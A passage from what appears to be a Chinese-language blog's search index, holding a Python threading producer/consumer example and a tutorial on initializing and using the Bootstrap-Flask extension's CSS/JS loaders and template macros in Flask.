class="token punctuation">,</span> condition<span class="token punctuation">)</span>  c<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果:</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">..</span><span class="token punctuation">..</span>.Producter condition lock acquire by Thread-1deque<span class="token punctuation">(</span><span class="token punctuation">[</span>138, 77, 138, 195<span class="token punctuation">]</span><span class="token punctuation">)</span>Producter condition lock acquire by Thread-4deque<span class="token punctuation">(</span><span class="token punctuation">[</span>68, 138, 77, 138, 195<span class="token punctuation">]</span><span class="token punctuation">)</span>Producter condition lock acquire by Thread-2Consumer condition acquired by Thread-5 popleft 68 from deque by Thread-5Consumer condition acquired by Thread-6 popleft 138 from deque by Thread-6<span class="token punctuation">..</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中第六行第七行有明显的阻塞线程的操作,把线程放在了<code>waiting</code>池中,等待<code>notify()</code> 重新唤醒.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask_bootstrap</title>
      <link href="/posts/42064.html"/>
      <url>/posts/42064.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-11-24/1606225199622-10333.png"></p><h2 id="Flask-Bootstrap"><a href="#Flask-Bootstrap" class="headerlink" title="Flask Bootstrap"></a><code>Flask Bootstrap</code></h2><h3 id="Bootstrap框架"><a href="#Bootstrap框架" class="headerlink" title="Bootstrap框架"></a><code>Bootstrap</code>框架</h3><blockquote><p><code>Bootstrap</code>中文<a href="https://www.bootcss.com/" target="_blank" rel="noopener">主站</a>:<code>https://www.bootcss.com/</code></p><p><code>Bootstrap4</code>:<code>https://getbootstrap.com/</code></p><p><code>Bootstrap</code>是基于<code>HTML\CSS\JAVASCRIPT</code>的前端框架.</p><ul><li>移动设备优先</li><li>主流浏览器支持</li><li>响应式设计</li></ul></blockquote><h3 id="Flask-Bootstrap-1"><a href="#Flask-Bootstrap-1" class="headerlink" title="Flask Bootstrap"></a><code>Flask Bootstrap</code></h3><blockquote><p>对于<code>Flask</code>来说,前期有一个相关扩展<code>Flask-Bootstrap</code>,不过作者很长时间没有更新过.于是有人基于它做了另外的一个扩展<code>Bootstrap-Flask</code>.</p><p><code>Bootstrap-Flask</code>支持<code>Bootstrap4</code>,并且基于<code>Jinja2</code>模板引擎的宏做了相关扩展.</p><p>参考代码:<code>https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T27</code></p></blockquote><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><blockquote><pre class="line-numbers language-bash">$ pip install bootstrap-flask</code></pre><p>如果之前安装过<code>flask-bootstrap</code>,需要先卸载,再安装<code>bootstrap-flask</code></p><pre><code class="bash"><code class="language-bash">$ pip install bootstrap-flask</code></pre><p>如果之前安装过<code>flask-bootstrap</code>,需要先卸载,再安装<code>bootstrap-flask</code></p><pre><code class="bash">$ pip uninstall flask-bootstrap bootstrap-flask$ pip install bootstrap-flask<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>官方文档:<code>https://bootstrap-flask.readthedocs.io/en/stable/</code></p></blockquote><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><blockquote><p>初始化很简单</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_bootstrap <span class="token keyword">import</span> Bootstrap<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>bootstrap <span class="token operator">=</span> Bootstrap<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者使用<code>init_app</code>的方式初始化</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_bootstrap <span class="token keyword">import</span> Bootstrap<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>bootstrap <span class="token operator">=</span> Bootstrap<span class="token punctuation">(</span><span class="token punctuation">)</span>bootstrap<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以浏览一下源码</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Bootstrap</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> app<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">if</span> app <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>         self<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">init_app</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">if</span> <span class="token operator">not</span> hasattr<span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">'extensions'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         app<span class="token punctuation">.</span>extensions <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>     app<span class="token punctuation">.</span>extensions<span class="token punctuation">[</span><span class="token string">'bootstrap'</span><span class="token punctuation">]</span> <span class="token operator">=</span> self     blueprint <span class="token operator">=</span> Blueprint<span class="token punctuation">(</span><span class="token string">'bootstrap'</span><span class="token punctuation">,</span> __name__<span class="token punctuation">,</span> template_folder<span class="token operator">=</span><span class="token string">'templates'</span><span class="token punctuation">,</span>                           static_folder<span class="token operator">=</span><span class="token string">'static'</span><span class="token punctuation">,</span> static_url_path<span class="token operator">=</span><span class="token string">'/bootstrap'</span> <span class="token operator">+</span> app<span class="token punctuation">.</span>static_url_path<span class="token punctuation">)</span>     app<span class="token punctuation">.</span>register_blueprint<span class="token punctuation">(</span>blueprint<span class="token punctuation">)</span>     app<span class="token punctuation">.</span>jinja_env<span class="token punctuation">.</span>globals<span class="token punctuation">[</span><span class="token string">'bootstrap'</span><span class="token punctuation">]</span> <span class="token operator">=</span> self     app<span class="token punctuation">.</span>jinja_env<span class="token punctuation">.</span>globals<span class="token punctuation">[</span><span class="token string">'bootstrap_is_hidden_field'</span><span class="token punctuation">]</span> <span class="token operator">=</span> is_hidden_field_filter     app<span class="token punctuation">.</span>jinja_env<span class="token punctuation">.</span>globals<span class="token punctuation">[</span><span class="token string">'get_table_titles'</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_table_titles     app<span class="token punctuation">.</span>jinja_env<span class="token punctuation">.</span>add_extension<span class="token punctuation">(</span><span class="token string">'jinja2.ext.do'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># default settings</span>     app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token string">'BOOTSTRAP_SERVE_LOCAL'</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>     app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token string">'BOOTSTRAP_BTN_STYLE'</span><span class="token punctuation">,</span> <span class="token string">'primary'</span><span class="token punctuation">)</span>     app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token string">'BOOTSTRAP_BTN_SIZE'</span><span class="token punctuation">,</span> <span class="token string">'md'</span><span class="token punctuation">)</span>     app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token string">'BOOTSTRAP_BOOTSWATCH_THEME'</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span>     app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token string">'BOOTSTRAP_ICON_SIZE'</span><span class="token punctuation">,</span> <span class="token string">'1em'</span><span class="token punctuation">)</span>     app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token string">'BOOTSTRAP_ICON_COLOR'</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span>     app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token string">'BOOTSTRAP_MSG_CATEGORY'</span><span class="token punctuation">,</span> <span class="token string">'primary'</span><span class="token punctuation">)</span> @staticmethod <span class="token keyword">def</span> <span class="token function">load_css</span><span class="token punctuation">(</span>version<span class="token operator">=</span>VERSION_BOOTSTRAP<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token triple-quoted-string string">"""Load Bootstrap's css resources with given version.     .. versionadded:: 0.1.0     :param version: The version of Bootstrap.     """</span>     css_filename <span class="token operator">=</span> <span class="token string">'bootstrap.min.css'</span>     serve_local <span class="token operator">=</span> current_app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'BOOTSTRAP_SERVE_LOCAL'</span><span class="token punctuation">]</span>     bootswatch_theme <span class="token operator">=</span> current_app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'BOOTSTRAP_BOOTSWATCH_THEME'</span><span class="token punctuation">]</span>     <span class="token keyword">if</span> <span class="token operator">not</span> bootswatch_theme<span class="token punctuation">:</span>         base_path <span class="token operator">=</span> <span class="token string">'css/'</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>         base_path <span class="token operator">=</span> <span class="token string">'css/swatch/%s/'</span> <span class="token operator">%</span> bootswatch_theme<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> serve_local<span class="token punctuation">:</span>         css <span class="token operator">=</span> <span class="token string">'&lt;link rel="stylesheet" href="%s" type="text/css">'</span> <span class="token operator">%</span> \             url_for<span class="token punctuation">(</span><span class="token string">'bootstrap.static'</span><span class="token punctuation">,</span> filename<span class="token operator">=</span>base_path <span class="token operator">+</span> css_filename<span class="token punctuation">)</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>         <span class="token keyword">if</span> <span class="token operator">not</span> bootswatch_theme<span class="token punctuation">:</span>             css <span class="token operator">=</span> <span class="token string">'&lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@%s/dist/css/%s"'</span> \                 <span class="token string">' type="text/css">'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>version<span class="token punctuation">,</span> css_filename<span class="token punctuation">)</span>         <span class="token keyword">else</span><span class="token punctuation">:</span>             css <span class="token operator">=</span> <span class="token string">'&lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootswatch@%s/dist/%s/%s"'</span> \                 <span class="token string">' type="text/css"'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>version<span class="token punctuation">,</span> bootswatch_theme<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> css_filename<span class="token punctuation">)</span>     <span class="token keyword">return</span> Markup<span class="token punctuation">(</span>css<span class="token punctuation">)</span> @staticmethod <span class="token keyword">def</span> <span class="token function">load_js</span><span class="token punctuation">(</span>version<span class="token operator">=</span>VERSION_BOOTSTRAP<span class="token punctuation">,</span> jquery_version<span class="token operator">=</span>VERSION_JQUERY<span class="token punctuation">,</span>             popper_version<span class="token operator">=</span>VERSION_POPPER<span class="token punctuation">,</span> with_jquery<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> with_popper<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token triple-quoted-string string">"""Load Bootstrap and related library's js resources with given version.     .. versionadded:: 0.1.0     :param version: The version of Bootstrap.     :param jquery_version: The version of jQuery.     :param popper_version: The version of Popper.js.     :param with_jquery: Include jQuery or not.     :param with_popper: Include Popper.js or not.     """</span>     js_filename <span class="token operator">=</span> <span class="token string">'bootstrap.min.js'</span>     jquery_filename <span class="token operator">=</span> <span class="token string">'jquery.min.js'</span>     popper_filename <span class="token operator">=</span> <span class="token string">'popper.min.js'</span>     serve_local <span class="token operator">=</span> current_app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'BOOTSTRAP_SERVE_LOCAL'</span><span class="token punctuation">]</span>     <span class="token keyword">if</span> serve_local<span class="token punctuation">:</span>         js <span class="token operator">=</span> <span class="token string">'&lt;script src="%s">&lt;/script>'</span> <span class="token operator">%</span> url_for<span class="token punctuation">(</span><span class="token string">'bootstrap.static'</span><span class="token punctuation">,</span> filename<span class="token operator">=</span><span class="token string">'js/'</span> <span class="token operator">+</span> js_filename<span class="token punctuation">)</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>         js <span class="token operator">=</span> <span class="token string">'&lt;script src="https://cdn.jsdelivr.net/npm/bootstrap@%s/dist/js/%s">'</span> \              <span class="token string">'&lt;/script>'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>version<span class="token punctuation">,</span> js_filename<span class="token punctuation">)</span>     <span class="token keyword">if</span> with_jquery<span class="token punctuation">:</span>         <span class="token keyword">if</span> serve_local<span class="token punctuation">:</span>             jquery <span class="token operator">=</span> <span class="token string">'&lt;script src="%s">&lt;/script>'</span> <span class="token operator">%</span> url_for<span class="token punctuation">(</span><span class="token string">'bootstrap.static'</span><span class="token punctuation">,</span> filename<span class="token operator">=</span>jquery_filename<span class="token punctuation">)</span>         <span class="token keyword">else</span><span class="token punctuation">:</span>             jquery <span class="token operator">=</span> <span class="token string">'&lt;script src="https://cdn.jsdelivr.net/npm/jquery@%s/dist/%s">'</span> \              <span class="token string">'&lt;/script>'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>jquery_version<span class="token punctuation">,</span> jquery_filename<span class="token punctuation">)</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>         jquery <span class="token operator">=</span> <span class="token string">''</span>     <span class="token keyword">if</span> with_popper<span class="token punctuation">:</span>         <span class="token keyword">if</span> serve_local<span class="token punctuation">:</span>             popper <span class="token operator">=</span> <span class="token string">'&lt;script src="%s">&lt;/script>'</span> <span class="token operator">%</span> url_for<span class="token punctuation">(</span><span class="token string">'bootstrap.static'</span><span class="token punctuation">,</span> filename<span class="token operator">=</span>popper_filename<span class="token punctuation">)</span>         <span class="token keyword">else</span><span class="token punctuation">:</span>             popper <span class="token operator">=</span> <span class="token string">'&lt;script src="https://cdn.jsdelivr.net/npm/popper.js@%s/dist/umd/%s">'</span> \                  <span class="token string">'&lt;/script>'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>popper_version<span class="token punctuation">,</span> popper_filename<span class="token punctuation">)</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>         popper <span class="token operator">=</span> <span class="token string">''</span>     <span class="token keyword">return</span> Markup<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''%s %s %s'''</span> <span class="token operator">%</span> <span class="token punctuation">(</span>jquery<span class="token punctuation">,</span> popper<span class="token punctuation">,</span> js<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很简单的初始化后,会把<code>bootstrap</code>添加到<code>Jinja2</code>的虚拟环境中,它默认使用的是<code>bootstrap4</code>,并且提供了2个基本的静态方法</p><ul><li><p><code>bootstrap.load_css()</code>:默认是<code>bootstrap4</code>,使用的是<code>CDN</code>分发<code>CSS</code>样式</p></li><li><p><code>bootstrap.load_js()</code>:默认是<code>bootstrap4</code>,使用的是<code>CDN</code>分发<code>js</code>样式</p><p>当然,如果你不想使用<code>bootstrap4</code>,也可以自定义版本,基本配置<code>config</code></p><table><thead><tr><th>配置</th><th>默认</th><th>说明</th></tr></thead><tbody><tr><td><code>BOOTSTRAP_SERVE_LOCAL</code></td><td><code>False</code></td><td><code>False</code>:自訂版本,<code>True</code>:系統默认版本</td></tr><tr><td><code>BOOTSTRAP_BTN_STYLE</code></td><td><code>primary</code></td><td><code>button</code>的样式</td></tr><tr><td><code>BOOTSTRAP_BTN_SIZE</code></td><td><code>md</code></td><td><code>button</code>大小</td></tr><tr><td><code>BOOTSTRAP_ICON_SIZE</code></td><td><code>lem</code></td><td>图标<code>icon</code>大小</td></tr><tr><td><code>BOOTSTRAP_ICON_COLOR</code></td><td><code>None</code></td><td>图标颜色</td></tr><tr><td><code>BOOTSTRAP_BOOTSWATCH_THEME</code></td><td><code>None</code></td><td><code>bootswatch</code>主题,<a href="https://bootswatch.com/" target="_blank" rel="noopener">参考</a></td></tr><tr><td><code>BOOTSTRAP_MSG_CATEGORY</code></td><td><code>primary</code></td><td><code>flask flash</code>样式</td></tr></tbody></table><p><code>bootstrap-flask</code>不提供基础模板<code>base.html</code>,需要自己创建.<code>load_css, load_js</code>都可以放置在<code>base.html</code>中,类似如下</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>....{{ bootstrap.load_css() }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>...{{ bootstrap.load_js() }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></blockquote><h4 id="启用宏"><a href="#启用宏" class="headerlink" title="启用宏"></a>启用宏</h4><blockquote><table><thead><tr><th align="left">Macro</th><th align="left">Templates Path</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">render_field()</td><td align="left">bootstrap/form.html</td><td align="left">渲染一个<code>WTForm</code>表单字段</td></tr><tr><td align="left">render_form()</td><td align="left">bootstrap/form.html</td><td align="left">渲染一个<code>WTForm</code>表单</td></tr><tr><td align="left">render_form_row()</td><td align="left">bootstrap/form.html</td><td align="left">Render a row of a grid form</td></tr><tr><td align="left">render_hidden_errors()</td><td align="left">bootstrap/form.html</td><td align="left">Render error messages for hidden form field</td></tr><tr><td align="left">render_pager()</td><td align="left">bootstrap/pagination.html</td><td align="left">Render a basic Flask-SQLAlchemy pagniantion 分页标签</td></tr><tr><td align="left">render_pagination()</td><td align="left">bootstrap/pagination.html</td><td align="left">Render a standard Flask-SQLAlchemy pagination 分页标签</td></tr><tr><td align="left">render_nav_item()</td><td align="left">bootstrap/nav.html</td><td align="left">Render a navigation item</td></tr><tr><td align="left">render_breadcrumb_item()</td><td align="left">bootstrap/nav.html</td><td align="left">Render a breadcrumb item</td></tr><tr><td align="left">render_static()</td><td align="left">bootstrap/utils.html</td><td align="left">Render a resource reference code (i.e. <code>&lt;link&gt;</code>, <code>&lt;script&gt;</code>)</td></tr><tr><td align="left">render_messages()</td><td align="left">bootstrap/utils.html</td><td align="left">Render flashed messages send by flash() function</td></tr><tr><td align="left">render_icon()</td><td align="left">bootstrap/utils.html</td><td align="left">Render a Bootstrap icon</td></tr><tr><td align="left">render_table()</td><td align="left">bootstrap/table.html</td><td align="left">Render a table with given data</td></tr></tbody></table><p>有关它的详细解释,参考官方文档:<code>https://bootstrap-flask.readthedocs.io/en/stable/macros.html#render-pagination</code></p><p>以下选取几个常用的进行渲染.</p></blockquote><h5 id="render-nav-item"><a href="#render-nav-item" class="headerlink" title="render_nav_item"></a><code>render_nav_item</code></h5><blockquote><p>渲染导航栏中的<code>URL</code>链接.</p><pre class="line-numbers language-python">render_nav_item(endpoint, text, badge=&#39;&#39;, use_li=False, **kwargs)</code></pre><p>查看它的定义能更容易理解</p><pre><code class="jinja2"><code class="language-python">render_nav_item(endpoint, text, badge=&#39;&#39;, use_li=False, **kwargs)</code></pre><p>查看它的定义能更容易理解</p><pre><code class="jinja2">{% macro render_nav_item(endpoint, text, badge='', use_li=False) %}>     {% if use_li %}<li class="nav-item">{% endif %}>     <a class="{% if not use_li %}nav-item{% endif %} nav-link {% if request.endpoint and request.endpoint == endpoint %}active{% endif %}">        href="{{ url_for(endpoint, **kwargs) }}">>         {{ text }} {% if badge %}<span class="badge badge-light">{{ badge }}</span>{% endif %}>     </a>>     {% if use_li %}</li>{% endif %}>   {% endmacro %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以到<code>bootstrap4</code>上找一个到导航示例<code>https://getbootstrap.com/docs/4.5/components/navbar/</code>,进行改造</p><p><code>base.html</code></p><pre class="line-numbers language-html"><code class="language-html">{% from 'bootstrap/nav.html' import render_nav_item %}<span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>      {% block title %}>   >         {% endblock %}  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  {{ bootstrap.load_css() }}  {{ bootstrap.load_js() }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar navbar-expand-lg navbar-light bg-light<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-toggler<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">data-toggle</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>collapse<span class="token punctuation">"</span></span> <span class="token attr-name">data-target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#navbarSupportedContent<span class="token punctuation">"</span></span> <span class="token attr-name">aria-controls</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbarSupportedContent<span class="token punctuation">"</span></span> <span class="token attr-name">aria-expanded</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token attr-name">aria-label</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Toggle navigation<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-toggler-icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>collapse navbar-collapse<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbarSupportedContent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar-nav mr-auto<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              {{ render_nav_item('index', '首页', use_li=True) }}              {{ render_nav_item('index', '首页', use_li=True) }}              {{ render_nav_item('index', '首页', use_li=True) }}          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在<code>index.html</code>中继承模板,</p><pre class="line-numbers language-jinja2"><code class="language-jinja2">{% extends 'base.html' %}{% block title %}>     首页>   {% endblock %}{% block content %}>     <h1>这是首页</h1>>   {% endblock %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行项目,可以查看结果.</p></blockquote><h5 id="render-messages"><a href="#render-messages" class="headerlink" title="render_messages"></a><code>render_messages</code></h5><blockquote><p>其实就是用来接受后端<code>flash</code>消息的,但是会内置一些样式在其中.</p><p>参数可以参考文档</p><p>使用如下</p><p><code>base.html</code></p><pre class="line-numbers language-html"><code class="language-html">{% from 'bootstrap/nav.html' import render_nav_item %}{% from 'bootstrap/utils.html' import render_messages %}<span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>      {% block title %}>   >         {% endblock %}  <span class="token tag"><span class="token 